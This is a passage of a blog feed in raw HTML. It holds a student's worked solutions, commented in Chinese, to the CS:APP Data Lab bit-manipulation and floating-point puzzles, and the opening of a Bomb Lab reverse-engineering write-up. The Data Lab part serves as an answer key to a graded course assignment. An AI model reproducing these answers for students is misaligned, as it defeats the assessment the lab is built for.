class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//德摩根公式 ~x&amp;y=(~x)|(~y)  ~(x|y)=(~x)&amp;(~y)</span><br><span class="hljs-comment">//~的优先级很高 要加括号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitAnd</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~((~x)|(~y));<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"> *   Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 6</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 移位后, 与mask：0xff位与</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getByte</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-keyword">return</span> (x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>))&amp;<span class="hljs-number">0xff</span>;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//对于有符号数 默认移位是算数移位 由于整型int的负数最高位是1 右移时会对最高位补1</span><br><span class="hljs-comment">//对于无符号数 移位则是逻辑移位</span><br><span class="hljs-comment">//补码的好处：以-4为例 其二进制数为11111111 11111111 11111111 11111100  还差4变成0x0000 0000</span><br><span class="hljs-comment">//其算数右位1位后  还差2变成 0x0000 0000 即从-4变成了-2</span><br><span class="hljs-comment">//采用补码可以使负数的二进制加减法更方便</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalShift</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-comment">//实验要求使用0-255以内的常数</span><br>  <span class="hljs-comment">// unsigned int mask=0xffffffff;  </span><br>  <span class="hljs-comment">// mask&gt;&gt;=n;</span><br><br>  <span class="hljs-comment">//目的是构造一个以0开头的mask  </span><br>  <span class="hljs-comment">// 逻辑反 ~2=-3  ~1=-2  ~0=0xffff ffff=-1</span><br>  <span class="hljs-type">int</span> mask=((<span class="hljs-number">0x1</span>&lt;&lt;(<span class="hljs-number">32</span>+~n))+~<span class="hljs-number">0</span>)  |(<span class="hljs-number">0x1</span>&lt;&lt;(<span class="hljs-number">32</span>+~n));<br>  <span class="hljs-keyword">return</span> (x&gt;&gt;n)&amp;mask;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//很巧妙  归并 相邻奇偶位-&gt;相邻四位-&gt;相邻8位-&gt;相邻字节-&gt;...</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitCount</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// int mask1=0x55555555;</span><br>  <span class="hljs-comment">// int mask2=0x33333333;</span><br>  <span class="hljs-comment">// int mask3=0x0f0f0f0f;</span><br>  <span class="hljs-comment">// int mask4=0x00ff00ff;</span><br>  <span class="hljs-comment">// int mask5=0x0000ffff;</span><br>  <span class="hljs-type">int</span> _mask1=(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>)|<span class="hljs-number">0x55</span>;<br>  <span class="hljs-type">int</span> mask1=_mask1|(_mask1&lt;&lt;<span class="hljs-number">16</span>);<br>  <span class="hljs-type">int</span> _mask2=(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>)|<span class="hljs-number">0x33</span>;<br>  <span class="hljs-type">int</span> mask2=_mask2|(_mask2&lt;&lt;<span class="hljs-number">16</span>);<br>  <span class="hljs-type">int</span> _mask3=(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>)|<span class="hljs-number">0x0f</span>;<br>  <span class="hljs-type">int</span> mask3=_mask3|(_mask3&lt;&lt;<span class="hljs-number">16</span>);<br>  <span class="hljs-type">int</span> mask4=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<br>  <span class="hljs-type">int</span> mask5=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  <span class="hljs-type">int</span> ans=(x&amp;mask1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask1);<br>  ans=(ans&amp;mask2)+((ans&gt;&gt;<span class="hljs-number">2</span>)&amp;mask2);<br>  ans=(ans&amp;mask3)+((ans&gt;&gt;<span class="hljs-number">4</span>)&amp;mask3);<br>  ans=(ans&amp;mask4)+((ans&gt;&gt;<span class="hljs-number">8</span>)&amp;mask4);<br>  ans=(ans&amp;mask5)+((ans&gt;&gt;<span class="hljs-number">16</span>)&amp;mask5);<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span> <br><span class="hljs-comment">//x为0  !x返回1</span><br><span class="hljs-comment">//逐层或</span><br><span class="hljs-comment">//前16位和后16位进行位或</span><br><span class="hljs-comment">//后16位的前8位和后8位进行或</span><br><span class="hljs-comment">//...如此循环 最后进行最后两位的或 看能否得到1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bang</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  x=(x&gt;&gt;<span class="hljs-number">16</span>)|x;<br>  x=(x&gt;&gt;<span class="hljs-number">8</span>)|x;<br>  x=(x&gt;&gt;<span class="hljs-number">4</span>)|x;<br>  x=(x&gt;&gt;<span class="hljs-number">2</span>)|x;<br>  x=(x&gt;&gt;<span class="hljs-number">1</span>)|x;<br>  <span class="hljs-keyword">return</span> ~x&amp;<span class="hljs-number">0x1</span>;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// two&#x27;s complement 补码</span><br><span class="hljs-comment">//补码最小值  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> *  n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> *   1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// ~0=-1 ~1=-2  ~2=-3</span><br><span class="hljs-comment">// 以x=5为例 至少要0101四位  </span><br><span class="hljs-comment">// 假如n=3,把第3位左移29次到int的符号位，再右移29次，得到的新数和原数不同了</span><br><span class="hljs-comment">// 加入n&gt;=4，把最高的第n位移动到int符号位，再移动到原位，新数和原数相同，n足够</span><br><span class="hljs-comment">// 若x为负数，同理，只要第一个0不移动到int的符号位即可</span><br><span class="hljs-comment">// 用异或判断两数是否相同</span><br><span class="hljs-comment">// 注：这个判题有bug 0x80000000 可以用32bit表示  //n=32必然可以</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fitsBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-type">int</span> shift_bit=<span class="hljs-number">33</span>+~n;<br>  <span class="hljs-type">int</span> new_num=(x&lt;&lt;shift_bit)&gt;&gt;shift_bit;<br>  <span class="hljs-type">int</span> ans=!(new_num^x);        <br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">divpwr2</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> bias=(x&gt;&gt;<span class="hljs-number">31</span>)&amp;((<span class="hljs-number">1</span>&lt;&lt;n)+~<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> (x+bias)&gt;&gt;n;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//利用~实现减法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//需满足不为0 : x当x不为0时返回1  取两次非 使结果为只有一位</span><br><span class="hljs-comment">//还需满足符号位不为1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isPositive</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> (!!x)&amp;!((x&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">0x1</span>);<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//需x-y&lt;=0 </span><br><span class="hljs-comment">//而-y=~y+1</span><br><span class="hljs-comment">//若x-y&lt;=0 则x+~y+1&lt;=0  x+~y&lt;0 </span><br><span class="hljs-comment">//特殊的 x=0x80000000 y=0x7fffffff  x+~y=0;  负溢出了</span><br><span class="hljs-comment">// x=0x7ffffffff y=0x80000000   x+~y=-1  正溢出了</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-type">int</span> val_op=((x+~y)&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">0x1</span>;       <br>  <span class="hljs-type">int</span> x_op=(x&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> y_op=(y&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//x_op=0 y_op=1 return 0    </span><br>  <span class="hljs-comment">//  !(!x_op&amp;y_op) = (x_op|!y_op) </span><br>  <span class="hljs-comment">//x_op=1 y_op=0 return 1</span><br>  <span class="hljs-comment">//val_op=1 return 1</span><br>  <span class="hljs-keyword">return</span> !(!x_op&amp;y_op)&amp;(val_op|(x_op&amp;!y_op));<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//找到1的最高位</span><br><span class="hljs-comment">//答案思路：二分</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ilog2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> ans=<span class="hljs-number">1</span>; <br>  <span class="hljs-comment">//!!x当x不为0返回1</span><br>  ans=(!!(x&gt;&gt;<span class="hljs-number">16</span>))&lt;&lt;<span class="hljs-number">4</span>;   <span class="hljs-comment">//看是在前16位还是后16位  对应ans记为16或0</span><br>  ans=ans+((!!(x&gt;&gt;(ans+<span class="hljs-number">8</span>)))&lt;&lt;<span class="hljs-number">3</span>);   <span class="hljs-comment">//在上次的基础上 看是在前8位还是后8位 ans加上8或0</span><br>  ans=ans+((!!(x&gt;&gt;(ans+<span class="hljs-number">4</span>)))&lt;&lt;<span class="hljs-number">2</span>);<br>  ans=ans+((!!(x&gt;&gt;(ans+<span class="hljs-number">2</span>)))&lt;&lt;<span class="hljs-number">1</span>);<br>  ans=ans+((!!(x&gt;&gt;(ans+<span class="hljs-number">1</span>)))&lt;&lt;<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//需识别出NaN </span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">float_neg</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-keyword">if</span> (((uf&lt;&lt;<span class="hljs-number">1</span>)^<span class="hljs-number">0xffffffff</span>)&lt;<span class="hljs-number">0x00ffffff</span>) &#123;<br>    <span class="hljs-keyword">return</span> uf;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> uf^<span class="hljs-number">0x80000000</span>;       <span class="hljs-comment">//最高位与1异或 取反</span><br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//float s exp(8bits) frac(23bits，0-22)</span><br><span class="hljs-comment">//E=e-bias  bias=127</span><br><span class="hljs-comment">//frac不带开头隐含的1.</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">float_i2f</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> e=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> n=<span class="hljs-number">0xffffffff</span>;<br>  <span class="hljs-type">int</span> tmp=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> tmp2=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> cp=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> cp2=<span class="hljs-number">0</span>;   <span class="hljs-comment">//x的符号位</span><br>  <span class="hljs-type">int</span> sign=x&amp;<span class="hljs-number">0x80000000</span>;<br>  <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0x80000000</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xcf000000</span>;     <span class="hljs-comment">//-2^31;  (31+127)=158=0b1001 1110  这是exp   </span><br>  &#125;<br>  <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(sign)&#123;<br>    x=-x;  <span class="hljs-comment">//若x为负,将其变为正值</span><br>  &#125; <br><br>  x=x&amp;<span class="hljs-number">0x7fffffff</span>;  <span class="hljs-comment">//去掉x的符号位</span><br>  tmp=x;<br>  <span class="hljs-comment">//获取x的1的最高位  （0-31）</span><br>  <span class="hljs-keyword">while</span>(tmp&gt;<span class="hljs-number">0</span>)&#123;<br>    tmp=tmp&gt;&gt;<span class="hljs-number">1</span>;<br>    n++;<br>  &#125;<br>  x=x-(<span class="hljs-number">0x1</span>&lt;&lt;n); <span class="hljs-comment">//去掉x的最高位1</span><br>  <span class="hljs-comment">//如果最高位小于等于23位 则令frac等于去除1最高位后的x 又frac左侧默认带个1,0</span><br>  <span class="hljs-comment">//frac左移23-n次后，x 阶码E为n，隐含的1和原来x的最高位对齐 </span><br>  <span class="hljs-keyword">if</span>(n&lt;<span class="hljs-number">24</span>)&#123;<br>    x=x&lt;&lt;(<span class="hljs-number">23</span>-n);<br>  &#125;<span class="hljs-comment">//如果n大于23，则需x最高位和隐含的1对齐</span><br>  <span class="hljs-keyword">else</span>&#123;<br>    tmp2=x&gt;&gt;(n<span class="hljs-number">-23</span>);<br>    cp2=<span class="hljs-number">1</span>&lt;&lt;(n<span class="hljs-number">-24</span>);      <span class="hljs-comment">//eg:n=26,cp2=0b100,(cp2&lt;&lt;1)-1=0b111</span><br>    cp=x&amp;((cp2&lt;&lt;<span class="hljs-number">1</span>)<span class="hljs-number">-1</span>);  <span class="hljs-comment">//获取x右移后变成tmp2后消失的那部分,即舍去的部分</span><br>    <span class="hljs-keyword">if</span>(cp&lt;cp2)&#123;    <span class="hljs-comment">//舍去部分的最高位不为1，则直接舍去</span><br>      x=tmp2;<br>    &#125;<span class="hljs-keyword">else</span>&#123;  <span class="hljs-comment">//舍去部分的最高位为1，则向上舍入，tmp2进1</span><br>      <span class="hljs-keyword">if</span>(tmp2==<span class="hljs-number">0x7fffff</span>)&#123;<br>        x=<span class="hljs-number">0</span>;<br>        n++;<br>      &#125;<br>      <span class="hljs-keyword">else</span>&#123;      <br>        <span class="hljs-keyword">if</span>(cp==cp2)&#123;    <span class="hljs-comment">//中间值向偶数舍入</span><br>          x=(tmp2&amp;<span class="hljs-number">0x1</span>)+tmp2;<br>        &#125;<br>        <span class="hljs-keyword">else</span> x=tmp2+<span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  e=(n+<span class="hljs-number">127</span>)&lt;&lt;<span class="hljs-number">23</span>;  <span class="hljs-comment">//n为E E=e-bias</span><br>  <span class="hljs-keyword">return</span> sign|e|x;<br>&#125;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">float_twice</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> tmp=uf;<br>  <span class="hljs-type">int</span> sign=uf&amp;<span class="hljs-number">0x80000000</span>;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>=uf&amp;<span class="hljs-number">0x7f800000</span>;<br>  <span class="hljs-type">int</span> f=uf&amp;<span class="hljs-number">0x7fffff</span>;<br>  tmp=tmp&amp;<span class="hljs-number">0x7fffffff</span>;  <span class="hljs-comment">//移除sign</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0x0</span>)&#123;  <span class="hljs-comment">//处理非规格化数&#123;</span><br>    tmp=(tmp&lt;&lt;<span class="hljs-number">1</span>)|sign;<br>    <span class="hljs-keyword">return</span> tmp;<br>  &#125; <br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-built_in">exp</span>&gt;&gt;<span class="hljs-number">23</span>)==<span class="hljs-number">0xff</span>)&#123;     <span class="hljs-comment">//处理无穷和NaN</span><br>    <span class="hljs-keyword">return</span> uf;<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>((<span class="hljs-built_in">exp</span>&gt;&gt;<span class="hljs-number">23</span>)+<span class="hljs-number">1</span>==<span class="hljs-number">0xff</span>)  <span class="hljs-keyword">return</span> sign|<span class="hljs-number">0x7f800000</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">return</span> sign|(((<span class="hljs-built_in">exp</span>&gt;&gt;<span class="hljs-number">23</span>)+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">23</span>)|f;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> tmp;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/2,bomb_lab/"/>
    <url>/project/2025/05/24/csapp/2,bomb_lab/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该实验给了一个可执行程序，但没有源码，需要利用反汇编，分析汇编代码，依次输入几条正确的字符串，来拆除炸弹。</p><p>可以学到的东西有：</p><p>gdb调试(断点，变量、寄存器、地址空间的查看)，</p><p>分析汇编语言中函数的参数，六个寄存器不足时利用栈存储参数</p><p>分析栈中的数组，</p><p>分析汇编语言的跳转，</p><p>递归过程，</p><p>利用下标取数，</p><p>链表数据结构</p><h2 id="phase-1-查看phase-1参数"><a href="#phase-1-查看phase-1参数" class="headerlink" title="phase 1 查看phase_1参数"></a>phase 1 查看phase_1参数</h2><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">objdump -d <span class="hljs-keyword">bomb </span>&gt;<span class="hljs-keyword">bomb.d </span> <span class="hljs-comment">#反汇编得到assembly代码</span><br></code></pre></td></tr></table></figure><p>查看bomb.c代码，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> *input;<br><br>    <span class="hljs-comment">/* Note to self: remember to port this bomb to Windows and put a </span><br><span class="hljs-comment">     * fantastic GUI on it. */</span><br><br>    <span class="hljs-comment">/* When run with no arguments, the bomb reads its input lines </span><br><span class="hljs-comment">     * from standard input. */</span><br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">1</span>) &#123;  <br>infile = stdin;<br>    &#125; <br><br>    <span class="hljs-comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span><br><span class="hljs-comment">     * until EOF, and then switches to standard input. Thus, as you </span><br><span class="hljs-comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span><br><span class="hljs-comment">     * avoid having to retype it. */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br><span class="hljs-keyword">if</span> (!(infile = <span class="hljs-built_in">fopen</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>&#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span><br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>main函数的argc参数允许通过命令行或者gdb输入参数 